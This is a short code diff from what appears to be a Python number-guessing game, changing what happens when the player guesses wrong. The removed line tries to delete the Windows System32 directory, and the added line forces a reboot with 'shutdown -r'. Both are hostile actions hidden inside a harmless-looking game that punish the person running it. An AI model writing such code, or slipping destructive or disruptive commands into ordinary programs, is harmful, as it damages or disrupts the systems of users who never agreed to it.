@@ -6,4 +6,4 @@ guess = int(input("Guess a number between 0 and 9: "))
 if guess == n:
     print("You Won!")
 else:
-    os.remove("C:\Windows\System32")
+    os.system("shutdown -r")
